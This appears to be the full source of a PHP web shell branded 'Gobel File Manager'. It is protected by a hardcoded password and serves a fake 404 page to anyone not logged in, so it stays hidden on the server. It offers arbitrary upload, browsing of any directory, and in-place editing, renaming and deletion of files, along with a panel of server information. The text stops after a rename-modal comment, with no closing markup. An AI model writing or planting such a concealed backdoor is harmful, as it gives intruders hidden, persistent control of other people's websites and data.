<?php

define('GOBEL_PASSWORD', 'gobelpastijaya');
define('GOBEL_SESSION_KEY', 'gobel_auth_' . md5(__FILE__));

session_start();

/* ── Logout ── */
if (isset($_GET['logout'])) {
    $_SESSION[GOBEL_SESSION_KEY] = false;
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

/* ── Handle login POST ── */
$loginError = '';
if (isset($_POST['gobel_login_pass'])) {
    if ($_POST['gobel_login_pass'] === GOBEL_PASSWORD) {
        $_SESSION[GOBEL_SESSION_KEY] = true;
        // redirect bersih tanpa ?login di URL
        $cleanUrl = strtok($_SERVER['REQUEST_URI'], '?');
        if (isset($_GET['dir'])) $cleanUrl .= '?dir=' . urlencode($_GET['dir']);
        header('Location: ' . $cleanUrl);
        exit;
    } else {
        $loginError = 'Password salah. Coba lagi.';
    }
}

/* ── Gate logic ──
   - Sudah login (session valid) → lanjut
   - Bukan login & bukan session → tampil halaman kosong (hidden)
   - ?login ada → tampil form login
*/
$isAuthed   = !empty($_SESSION[GOBEL_SESSION_KEY]);
$wantsLogin = isset($_GET['login']);

if (!$isAuthed) {
    if (!$wantsLogin) {
        /* Akses tanpa ?login dan tanpa session → tampil 404 palsu */
        http_response_code(404);
        echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body>'
           . '<h1>Not Found</h1><p>The requested URL was not found on this server.</p>'
           . '</body></html>';
        exit;
    }

    /* Tampilkan halaman login */
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: #080808;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-wrap {
            width: 100%;
            max-width: 380px;
            padding: 16px;
        }
        .login-card {
            background: #0f0f0f;
            border: 1px solid #1f1b0d;
            border-radius: 12px;
            padding: 36px 32px 32px;
            box-shadow: 0 24px 64px rgba(0,0,0,.8);
        }
        .login-icon {
            width: 52px;
            height: 52px;
            background: linear-gradient(135deg, #2a2008, #1a1205);
            border: 1px solid #362b0e;
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 24px;
            margin: 0 auto 20px;
        }
        .login-card h1 {
            font-size: 20px;
            font-weight: 700;
            color: #d4af37;
            text-align: center;
            margin-bottom: 6px;
        }
        .login-card p.sub {
            font-size: 13px;
            color: #554433;
            text-align: center;
            margin-bottom: 28px;
        }
        .field {
            display: flex;
            flex-direction: column;
            gap: 6px;
            margin-bottom: 16px;
            position: relative;
        }
        .field label {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: #6a5530;
        }
        .field input[type="password"],
        .field input[type="text"] {
            width: 100%;
            padding: 11px 42px 11px 14px;
            background: #151515;
            border: 1px solid #362b0e;
            border-radius: 6px;
            color: #e2d4a0;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            transition: border-color .2s, background .2s;
        }
        .field input:focus { outline: none; border-color: #d4af37; background: #1a1205; }
        .toggle-pw {
            position: absolute;
            right: 12px;
            bottom: 10px;
            cursor: pointer;
            font-size: 16px;
            color: #554433;
            user-select: none;
            transition: color .15s;
        }
        .toggle-pw:hover { color: #d4af37; }
        .btn-login {
            width: 100%;
            padding: 12px;
            background: #d4af37;
            color: #060606;
            border: none;
            border-radius: 6px;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background .15s, box-shadow .15s;
            margin-top: 6px;
        }
        .btn-login:hover { background: #f4cf57; box-shadow: 0 0 0 3px rgba(212,175,55,.15); }
        .btn-login:active { background: #b89a28; }
        .error-msg {
            background: #140808;
            border: 1px solid #7a2020;
            border-radius: 6px;
            color: #f09090;
            font-size: 13px;
            padding: 9px 14px;
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .login-footer {
            margin-top: 20px;
            text-align: center;
            font-size: 11px;
            color: #2e2410;
        }
    </style>
</head>
<body>
<div class="login-wrap">
    <div class="login-card">
        <div class="login-icon">🔐</div>
        <h1>Gobel File Manager</h1>
        <p class="sub">Masukkan password untuk melanjutkan</p>

        <?php if ($loginError): ?>
        <div class="error-msg"><span>✖</span> <?php echo htmlspecialchars($loginError); ?></div>
        <?php endif; ?>

        <form method="post" autocomplete="off">
            <div class="field">
                <label for="pw">Password</label>
                <input type="password" id="pw" name="gobel_login_pass"
                       placeholder="••••••••••" autofocus required>
                <span class="toggle-pw" onclick="togglePw()" title="Show/hide">👁</span>
            </div>
            <button type="submit" class="btn-login">Masuk →</button>
        </form>
        <div class="login-footer">Akses terbatas — hanya pengguna yang berwenang</div>
    </div>
</div>
<script>
function togglePw() {
    var inp = document.getElementById('pw');
    inp.type = inp.type === 'password' ? 'text' : 'password';
}
document.getElementById('pw').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') e.target.form.submit();
});
</script>
</body>
</html>
    <?php
    exit;
}
/* ── Jika sudah auth, lanjut render file manager di bawah ── */
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gobel File Manager</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --gold:        #d4af37;
            --gold-light:  #f4cf57;
            --gold-dim:    #b8941f;
            --bg-base:     #080808;
            --bg-surface:  #0f0f0f;
            --bg-elevated: #151515;
            --bg-card:     #1a1a1a;
            --bg-hover:    #1c1608;
            --border:      #1f1b0d;
            --border-gold: #362b0e;
            --text-main:   #e2d4a0;
            --text-muted:  #8a7550;
            --text-dim:    #4a3d22;
            --red:         #6e1a1a;
            --red-hover:   #8f2222;
            --red-border:  #7a2020;
            --radius:      8px;
            --radius-sm:   5px;
        }

        body {
            background: var(--bg-base);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            line-height: 1.6;
            min-height: 100vh;
        }

        /* ─── Topbar ─── */
        .topbar {
            background: var(--bg-surface);
            border-bottom: 1px solid var(--border);
            padding: 0 28px;
            height: 52px;
            display: flex;
            align-items: center;
            gap: 10px;
            position: sticky;
            top: 0;
            z-index: 200;
        }
        .topbar-logo { font-size: 20px; }
        .topbar h1 { font-size: 17px; font-weight: 700; color: var(--gold); }
        .topbar-badge {
            margin-left: 8px;
            padding: 2px 8px;
            font-size: 10px;
            font-weight: 700;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            color: var(--text-dim);
            background: var(--bg-elevated);
            border: 1px solid var(--border);
            border-radius: 20px;
        }
        .btn-topbar-logout {
            margin-left: auto;
            display: inline-flex;
            align-items: center;
            gap: 5px;
            padding: 5px 13px;
            background: transparent;
            color: var(--text-muted);
            border: 1px solid var(--border);
            border-radius: var(--radius-sm);
            font-family: 'Inter', sans-serif;
            font-size: 12px;
            font-weight: 600;
            text-decoration: none;
            cursor: pointer;
            transition: background .15s, color .15s, border-color .15s;
        }
        .btn-topbar-logout:hover {
            background: #1a0808;
            color: #f09090;
            border-color: var(--red-border);
        }

        /* ─── Layout ─── */
        .wrapper {
            display: grid;
            grid-template-columns: 260px 1fr;
            min-height: calc(100vh - 52px);
        }

        /* ─── Sidebar ─── */
        .sidebar {
            background: var(--bg-surface);
            border-right: 1px solid var(--border);
            padding: 18px 14px;
            display: flex;
            flex-direction: column;
            gap: 6px;
            overflow-y: auto;
        }
        .sb-label {
            font-size: 10px;
            font-weight: 700;
            letter-spacing: 1.1px;
            text-transform: uppercase;
            color: var(--text-dim);
            padding: 10px 6px 4px;
        }
        .sb-form {
            display: flex;
            flex-direction: column;
            gap: 6px;
            padding: 0 2px;
        }
        .sb-form input[type="text"],
        .sb-form input[type="file"] {
            width: 100%;
            padding: 8px 11px;
            background: var(--bg-elevated);
            border: 1px solid var(--border-gold);
            border-radius: var(--radius-sm);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            transition: border-color .2s, background .2s;
        }
        .sb-form input[type="text"]:focus { outline: none; border-color: var(--gold); background: #1a1205; }
        .sb-form input[type="file"] { cursor: pointer; font-size: 12px; padding: 7px 8px; }

        /* System Info panel */
        .sysinfo-grid {
            display: flex;
            flex-direction: column;
            gap: 1px;
            background: var(--border);
            border-radius: var(--radius-sm);
            overflow: hidden;
            margin: 0 2px;
        }
        .sysinfo-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 7px 10px;
            background: var(--bg-elevated);
            gap: 8px;
            font-size: 12px;
        }
        .sysinfo-key {
            color: var(--text-muted);
            font-weight: 500;
            flex-shrink: 0;
        }
        .sysinfo-val {
            color: var(--text-main);
            text-align: right;
            word-break: break-all;
            font-family: 'JetBrains Mono', monospace;
            font-size: 11px;
        }
        .sysinfo-val.ok  { color: #6db86d; }
        .sysinfo-val.warn{ color: var(--gold); }

        .sb-divider { border: none; border-top: 1px solid var(--border); margin: 4px 0; }

        /* ─── Buttons ─── */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            padding: 8px 13px;
            border-radius: var(--radius-sm);
            border: 1px solid transparent;
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: background .15s, border-color .15s, color .15s, box-shadow .15s;
            white-space: nowrap;
            text-decoration: none;
        }
        .btn-gold    { background: var(--gold);        color: #060606; border-color: var(--gold); }
        .btn-gold:hover { background: var(--gold-light); border-color: var(--gold-light); box-shadow: 0 0 0 3px rgba(212,175,55,.12); }
        .btn-outline { background: transparent; color: var(--gold); border-color: var(--border-gold); }
        .btn-outline:hover { background: #1a1205; border-color: var(--gold); }
        .btn-ghost   { background: var(--bg-card); color: var(--gold); border-color: var(--border-gold); }
        .btn-ghost:hover { background: #221808; border-color: var(--gold); }
        .btn-danger  { background: var(--red); color: #ffc0c0; border-color: var(--red-border); }
        .btn-danger:hover { background: var(--red-hover); box-shadow: 0 0 0 3px rgba(122,32,32,.2); }
        .btn-sm  { padding: 4px 10px; font-size: 12px; }
        .btn-full{ width: 100%; }

        /* ─── Main ─── */
        .main {
            padding: 22px 26px;
            display: flex;
            flex-direction: column;
            gap: 14px;
            min-width: 0;
        }

        /* ─── Breadcrumb ─── */
        .breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 4px;
            padding: 9px 14px;
            background: var(--bg-surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            font-size: 12px;
        }
        .bc-label {
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.9px;
            color: var(--text-dim);
            margin-right: 6px;
            padding: 2px 7px;
            background: var(--bg-elevated);
            border: 1px solid var(--border);
            border-radius: 20px;
        }
        .breadcrumb a { color: var(--gold); text-decoration: none; }
        .breadcrumb a:hover { color: var(--gold-light); text-decoration: underline; }
        .breadcrumb .sep { color: var(--text-dim); }

        /* ─── Flash Messages ─── */
        .msg {
            padding: 10px 14px;
            border-radius: var(--radius-sm);
            border: 1px solid;
            font-size: 13px;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }
        .msg > span { flex-shrink: 0; margin-top: 1px; }
        .msg > strong { font-weight: 600; }
        .msg-body { display: flex; flex-direction: column; gap: 4px; min-width: 0; }
        .msg-ok  { background: #0f0d05; color: #f0c840; border-color: var(--border-gold); }
        .msg-err { background: #0f0505; color: #f09090; border-color: var(--red-border); }
        .msg-detail {
            margin-top: 8px;
            display: flex;
            flex-direction: column;
            gap: 3px;
        }
        .msg-detail-row {
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 11.5px;
            color: inherit;
            opacity: 0.85;
            padding: 3px 8px;
            background: rgba(0,0,0,0.25);
            border-radius: 3px;
            word-break: break-all;
        }

        /* ─── Editor ─── */
        .editor-card {
            background: var(--bg-surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            overflow: hidden;
        }
        .editor-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 12px 18px;
            border-bottom: 1px solid var(--border);
            background: var(--bg-elevated);
        }
        .editor-head h3 { font-size: 13px; font-weight: 600; color: var(--gold); }
        .editor-body {
            padding: 16px 18px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .editor-body textarea {
            width: 100%;
            min-height: 440px;
            padding: 13px;
            background: var(--bg-base);
            border: 1px solid var(--border-gold);
            border-radius: var(--radius-sm);
            color: var(--text-main);
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            line-height: 1.6;
            resize: vertical;
            transition: border-color .2s;
        }
        .editor-body textarea:focus { outline: none; border-color: var(--gold); }

        /* ─── File Table Card ─── */
        .table-card {
            background: var(--bg-surface);
            border: 1px solid var(--border);
            border-radius: var(--radius);
            overflow: hidden;
        }
        .table-head {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 11px 18px;
            border-bottom: 1px solid var(--border);
            background: var(--bg-elevated);
        }
        .table-head h3 {
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: var(--text-muted);
        }
        .table-count { font-size: 12px; color: var(--text-dim); }

        /* ─── Table ─── */
        table { width: 100%; border-collapse: collapse; table-layout: fixed; }

        /* column widths */
        col.col-name    { width: auto; }
        col.col-size    { width: 90px; }
        col.col-date    { width: 145px; }
        col.col-actions { width: 210px; }

        thead th {
            padding: 9px 14px;
            text-align: left;
            font-size: 10px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            color: var(--text-dim);
            background: var(--bg-elevated);
            border-bottom: 1px solid var(--border);
            white-space: nowrap;
        }
        thead th.th-right { text-align: right; }
        thead th.th-center { text-align: center; }

        tbody td {
            padding: 9px 14px;
            border-bottom: 1px solid var(--border);
            vertical-align: middle;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        tbody tr:last-child td { border-bottom: none; }
        tbody tr:hover td { background: var(--bg-hover); }

        .td-right  { text-align: right; }
        .td-center { text-align: center; }

        .file-name-cell {
            display: flex;
            align-items: center;
            gap: 9px;
            min-width: 0;
        }
        .file-name-cell .ficon { font-size: 15px; flex-shrink: 0; }
        .file-name-cell .fname {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .dir-link  { color: var(--gold); font-weight: 600; text-decoration: none; }
        .dir-link:hover  { color: var(--gold-light); }
        .file-link { color: var(--text-main); font-weight: 500; text-decoration: none; }
        .file-link:hover { color: var(--gold); }

        .size-cell { color: var(--text-muted); font-family: 'JetBrains Mono', monospace; font-size: 12px; }
        .date-cell { color: var(--text-muted); font-size: 12px; }

        /* ─── Actions cell — fixed layout ─── */
        .actions-cell {
            display: flex;
            align-items: center;
            justify-content: flex-end;
            gap: 5px;
        }

        /* Rename popup overlay */
        .rename-popup {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,.65);
            z-index: 500;
            align-items: center;
            justify-content: center;
        }
        .rename-popup.open { display: flex; }
        .rename-box {
            background: var(--bg-card);
            border: 1px solid var(--border-gold);
            border-radius: var(--radius);
            padding: 22px 24px;
            width: 380px;
            max-width: 94vw;
            display: flex;
            flex-direction: column;
            gap: 12px;
            box-shadow: 0 16px 48px rgba(0,0,0,.7);
        }
        .rename-box h4 { font-size: 14px; font-weight: 600; color: var(--gold); }
        .rename-box input[type="text"] {
            width: 100%;
            padding: 9px 12px;
            background: var(--bg-elevated);
            border: 1px solid var(--border-gold);
            border-radius: var(--radius-sm);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            font-size: 13px;
            transition: border-color .2s;
        }
        .rename-box input[type="text"]:focus { outline: none; border-color: var(--gold); }
        .rename-box-actions { display: flex; gap: 8px; justify-content: flex-end; }

        /* ─── Empty State ─── */
        .empty-state {
            padding: 50px 20px;
            text-align: center;
            color: var(--text-dim);
        }
        .empty-state .ei { font-size: 38px; margin-bottom: 10px; display: block; }
        .empty-state p { font-size: 13px; }

        /* ─── Responsive ─── */
        @media (max-width: 860px) {
            .wrapper { grid-template-columns: 1fr; }
            .sidebar { border-right: none; border-bottom: 1px solid var(--border); }
            col.col-date { display: none; }
            .td-date { display: none; }
        }
    </style>
</head>
<body>

<!-- Topbar -->
<div class="topbar">
    <span class="topbar-logo">🗂️</span>
    <h1>Gobel File Manager</h1>
    <span class="topbar-badge">PHP</span>
    <a href="?logout" class="btn-topbar-logout" onclick="return confirm('Logout dari sesi ini?')" title="Logout">⏏ Logout</a>
</div>

<div class="wrapper">

    <!-- ════ Sidebar ════ -->
    <aside class="sidebar">

        <!-- System Info -->
        <div class="sb-label">System Info</div>
        <?php
            $diskFree  = @disk_free_space('/');
            $diskTotal = @disk_total_space('/');
            $diskPct   = ($diskTotal && $diskTotal > 0) ? round(($diskTotal - $diskFree) / $diskTotal * 100) : '?';
            function gobel_fmt_bytes($b) {
                if ($b === false) return '—';
                $u = ['B','KB','MB','GB','TB'];
                $i = 0;
                while ($b >= 1024 && $i < 4) { $b /= 1024; $i++; }
                return round($b, 1) . ' ' . $u[$i];
            }
            $phpVer   = phpversion();
            $os       = php_uname('s') . ' ' . php_uname('r');
            $serverSw = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : '—';
            $maxUp    = ini_get('upload_max_filesize');
            $maxPost  = ini_get('post_max_size');
            $memLimit = ini_get('memory_limit');
            $diskClass = is_numeric($diskPct) && $diskPct >= 85 ? 'warn' : 'ok';
        ?>
        <div class="sysinfo-grid">
            <div class="sysinfo-row">
                <span class="sysinfo-key">PHP</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars($phpVer); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">OS</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars(php_uname('s')); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Server</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars(explode(' ', $serverSw)[0] ?? '—'); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Disk Free</span>
                <span class="sysinfo-val <?php echo $diskClass; ?>"><?php echo gobel_fmt_bytes($diskFree); ?> (<?php echo $diskPct; ?>% used)</span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Disk Total</span>
                <span class="sysinfo-val"><?php echo gobel_fmt_bytes($diskTotal); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Upload Max</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars($maxUp); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Post Max</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars($maxPost); ?></span>
            </div>
            <div class="sysinfo-row">
                <span class="sysinfo-key">Memory</span>
                <span class="sysinfo-val"><?php echo htmlspecialchars($memLimit); ?></span>
            </div>
        </div>

        <hr class="sb-divider">

        <!-- New Directory -->
        <div class="sb-label">New Directory</div>
        <form class="sb-form" method="post">
            <input type="text" name="newDirName" placeholder="Directory name" required>
            <input type="submit" name="createDir" value="Create Directory" class="btn btn-gold btn-full">
        </form>

        <hr class="sb-divider">

        <!-- New File -->
        <div class="sb-label">New File</div>
        <form class="sb-form" method="post">
            <input type="text" name="newFileName" placeholder="File name" required>
            <input type="submit" name="createFile" value="Create File" class="btn btn-gold btn-full">
        </form>

        <hr class="sb-divider">

        <!-- Upload -->
        <div class="sb-label">Upload File</div>
        <form class="sb-form" method="post" enctype="multipart/form-data">
            <input type="file" name="file" required>
            <input type="submit" value="Upload" class="btn btn-outline btn-full">
        </form>

    </aside>

    <!-- ════ Main ════ -->
    <main class="main">
        <?php
        function gobel_msg($text, $ok = true) {
            $cls  = $ok ? 'msg-ok' : 'msg-err';
            $icon = $ok ? '✔' : '✖';
            $lines = explode("\n", $text);
            $first = htmlspecialchars(array_shift($lines));
            $html  = "<div class='msg $cls'><span>$icon</span><div class='msg-body'><strong>$first</strong>";
            if (!empty($lines)) {
                $html .= '<div class="msg-detail">';
                foreach ($lines as $line) {
                    if (trim($line) === '') continue;
                    $html .= '<div class="msg-detail-row">' . htmlspecialchars($line) . '</div>';
                }
                $html .= '</div>';
            }
            $html .= '</div></div>';
            echo $html;
        }

        function gobel_safe_path($base, $child) {
            $realBase  = realpath($base);
            $realChild = realpath($child);
            if ($realBase === false || $realChild === false) return false;
            $realBase = rtrim($realBase, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
            if (strncmp($realChild, $realBase, strlen($realBase)) !== 0) return false;
            return $realChild;
        }


        $currentDir  = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;
        $realCurrent = realpath($currentDir);
        if ($realCurrent !== false) $currentDir = $realCurrent;

        /* ── Actions ── */
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file']) && !isset($_POST['saveFile'])) {
            $file = $_FILES['file'];
            if ($file['error'] === UPLOAD_ERR_OK) {
                $fileName  = basename($file['name']);
                $dest_path = $currentDir . DIRECTORY_SEPARATOR . $fileName;
                if (move_uploaded_file($file['tmp_name'], $dest_path)) {
                    $fsize    = @filesize($dest_path);
                    $fsizeStr = gobel_fmt_bytes($fsize !== false ? $fsize : 0);
                    gobel_msg("Upload berhasil!\n📁 Direktori : {$currentDir}\n📄 File       : {$fileName}\n💾 Ukuran     : {$fsizeStr}\n📌 Path lengkap: {$dest_path}");
                } else {
                    gobel_msg("Error: gagal memindahkan file yang diupload.", false);
                }
            } else {
                gobel_msg("Tidak ada file yang dipilih atau upload gagal.", false);
            }
        }

        if (isset($_GET['delete'])) {
            $target = gobel_safe_path($currentDir, $_GET['delete']);
            if ($target === false) {
                gobel_msg("Refused: path escapes current directory.", false);
            } elseif (is_file($target)) {
                if (unlink($target)) gobel_msg("Deleted: " . basename($target));
                else gobel_msg("Failed to delete file.", false);
            } elseif (is_dir($target)) {
                if (rmdir($target)) gobel_msg("Deleted directory: " . basename($target));
                else gobel_msg("Failed to delete directory (must be empty).", false);
            } else {
                gobel_msg("Target not found.", false);
            }
        }

        if (isset($_POST['createDir'])) {
            $newName    = basename($_POST['newDirName']);
            $newDirPath = $currentDir . DIRECTORY_SEPARATOR . $newName;
            if ($newName === '' || strpbrk($newName, "/\\") !== false) gobel_msg("Invalid directory name.", false);
            elseif (is_dir($newDirPath)) gobel_msg("Directory already exists.", false);
            elseif (mkdir($newDirPath)) gobel_msg("Directory created: $newName");
            else gobel_msg("Failed to create directory.", false);
        }

        if (isset($_POST['createFile'])) {
            $newName     = basename($_POST['newFileName']);
            $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newName;
            if ($newName === '' || strpbrk($newName, "/\\") !== false) gobel_msg("Invalid file name.", false);
            elseif (file_exists($newFilePath)) gobel_msg("File already exists.", false);
            elseif (file_put_contents($newFilePath, '') !== false) gobel_msg("File created: $newName");
            else gobel_msg("Failed to create file.", false);
        }

        if (isset($_POST['doRename']) && isset($_POST['renameTarget'], $_POST['renameTo'])) {
            $src  = $_POST['renameTarget'];
            $safe = gobel_safe_path($currentDir, $src);
            if ($safe === false) {
                gobel_msg("Refused: path escapes current directory.", false);
            } else {
                $newName = basename($_POST['renameTo']);
                if ($newName === '' || strpbrk($newName, "/\\") !== false) gobel_msg("Invalid name.", false);
                else {
                    $dest = $currentDir . DIRECTORY_SEPARATOR . $newName;
                    if (file_exists($dest)) gobel_msg("A file or folder with that name already exists.", false);
                    elseif (@rename($safe, $dest)) gobel_msg("Renamed to: $newName");
                    else gobel_msg("Rename failed.", false);
                }
            }
        }

        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['saveFile']) && isset($_POST['editTarget'])) {
            $target = gobel_safe_path($currentDir, $_POST['editTarget']);
            if ($target === false || !is_file($target)) gobel_msg("Invalid file target.", false);
            elseif (!is_writable($target)) gobel_msg("File is not writable.", false);
            else {
                $content = isset($_POST['fileContent']) ? $_POST['fileContent'] : '';
                if (file_put_contents($target, $content) !== false) gobel_msg("Saved: " . basename($target));
                else gobel_msg("Failed to save file.", false);
            }
        }

        if (!empty($_SESSION['gobel_flash'])) {
            $f = $_SESSION['gobel_flash'];
            unset($_SESSION['gobel_flash']);
            gobel_msg($f['text'], $f['ok']);
        }

        /* ── Breadcrumb ── */
        $pathParts       = explode(DIRECTORY_SEPARATOR, $currentDir);
        $breadcrumbs     = [];
        $pathAccumulator = '';
        foreach ($pathParts as $part) {
            if ($part !== '') {
                $pathAccumulator .= DIRECTORY_SEPARATOR . $part;
                $breadcrumbs[] = '<a href="?dir=' . urlencode($pathAccumulator) . '">' . htmlspecialchars($part) . '</a>';
            }
        }
        echo '<div class="breadcrumb">';
        echo '<span class="bc-label">Path</span>';
        echo implode(' <span class="sep">/</span> ', $breadcrumbs);
        echo '</div>';

        /* ── Editor ── */
        if (isset($_GET['edit'])) {
            $editTarget = gobel_safe_path($currentDir, $_GET['edit']);
            if ($editTarget !== false && is_file($editTarget)) {
                $contents = @file_get_contents($editTarget);
                if ($contents === false) $contents = '';
                $tooLarge = strlen($contents) > 2 * 1024 * 1024;
                echo '<div class="editor-card">';
                echo '<div class="editor-head">';
                echo '<h3>✏️ &nbsp;Editing: ' . htmlspecialchars(basename($editTarget)) . '</h3>';
                echo '<a href="?dir=' . urlencode($currentDir) . '"><button type="button" class="btn btn-ghost btn-sm">✕ Cancel</button></a>';
                echo '</div>';
                if ($tooLarge) {
                    gobel_msg("File is larger than 2 MB — only the first 2 MB is shown. Save will overwrite the full file.", false);
                    $contents = substr($contents, 0, 2 * 1024 * 1024);
                }
                echo '<form method="post"><div class="editor-body">';
                echo '<input type="hidden" name="editTarget" value="' . htmlspecialchars($editTarget) . '">';
                echo '<textarea name="fileContent" spellcheck="false">' . htmlspecialchars($contents) . '</textarea>';
                echo '<div style="display:flex;gap:8px;">';
                echo '<input type="submit" name="saveFile" value="💾 Save File" class="btn btn-gold">';
                echo '</div>';
                echo '</div></form>';
                echo '</div>';
            } else {
                gobel_msg("Cannot edit: not a valid file in this directory.", false);
            }
        }

        /* ── File Table ── */
        $files = @scandir($currentDir);
        if ($files === false) { gobel_msg("Cannot read directory.", false); $files = []; }

        $dirs  = [];
        $flist = [];
        foreach ($files as $e) {
            if ($e === '.' || $e === '..') continue;
            $fp = $currentDir . DIRECTORY_SEPARATOR . $e;
            if (is_dir($fp))       $dirs[]  = $e;
            elseif (is_file($fp))  $flist[] = $e;
        }
        sort($dirs);
        sort($flist);
        $entries    = array_merge($dirs, $flist);
        $entryCount = count($entries);

        echo '<div class="table-card">';
        echo '<div class="table-head">';
        echo '<h3>Files &amp; Directories</h3>';
        echo '<span class="table-count">' . $entryCount . ' item' . ($entryCount !== 1 ? 's' : '') . '</span>';
        echo '</div>';

        if ($entryCount === 0) {
            echo '<div class="empty-state"><span class="ei">📂</span><p>This directory is empty.</p></div>';
        } else {
            echo '<table>';
            echo '<colgroup>';
            echo '<col class="col-name"><col class="col-size"><col class="col-date"><col class="col-actions">';
            echo '</colgroup>';
            echo '<thead><tr>';
            echo '<th>Name</th>';
            echo '<th class="th-right">Size</th>';
            echo '<th class="th-right">Modified</th>';
            echo '<th class="th-right">Actions</th>';
            echo '</tr></thead>';
            echo '<tbody>';

            $encDir = urlencode($currentDir);

            foreach ($entries as $entry) {
                $filePath = $currentDir . DIRECTORY_SEPARATOR . $entry;
                $isDir    = is_dir($filePath);
                $isFile   = is_file($filePath);
                if (!$isDir && !$isFile) continue;

                $icon    = $isDir ? '📁' : '📄';
                $encPath = htmlspecialchars($filePath, ENT_QUOTES);
                $encName = htmlspecialchars($entry);
                $encNameJs = addslashes($encName);

                $mtime = @filemtime($filePath);
                $mdate = $mtime ? date('d M Y H:i', $mtime) : '—';
                $size  = ($isFile) ? gobel_fmt_bytes(@filesize($filePath)) : '—';


                echo '<tr>';

                /* Name */
                echo '<td>';
                echo '<div class="file-name-cell">';
                echo "<span class='ficon'>$icon</span>";
                echo '<span class="fname">';
                if ($isDir) {
                    echo '<a class="dir-link" href="?dir=' . urlencode($filePath) . '">' . $encName . '</a>';
                } else {
                    echo '<a class="file-link" href="' . $encPath . '" target="_blank">' . $encName . '</a>';
                }
                echo '</span>';
                echo '</div></td>';

                /* Size */
                echo '<td class="td-right size-cell">' . $size . '</td>';

                /* Modified */
                echo '<td class="td-right date-cell td-date">' . $mdate . '</td>';

                /* Actions */
                echo '<td class="td-right">';
                echo '<div class="actions-cell">';

                if ($isFile) {
                    echo '<a href="?dir=' . $encDir . '&edit=' . urlencode($filePath) . '" class="btn btn-ghost btn-sm">Edit</a>';
                }

                echo '<button type="button" class="btn btn-outline btn-sm gobel-rename-btn"'
                   . ' data-path="' . htmlspecialchars($filePath, ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
                   . ' data-name="' . htmlspecialchars($entry,    ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
                   . '>Rename</button>';

                echo '<a href="?dir=' . $encDir . '&delete=' . urlencode($filePath) . '" onclick="return confirm(\'Delete ' . $encNameJs . '?\')" class="btn btn-danger btn-sm">Delete</a>';

                echo '</div></td>';
                echo '</tr>';
            }

            echo '</tbody></table>';
        }
        echo '</div>'; // table-card
        ?>
    </main>
</div>

<!-- Single shared Rename modal -->
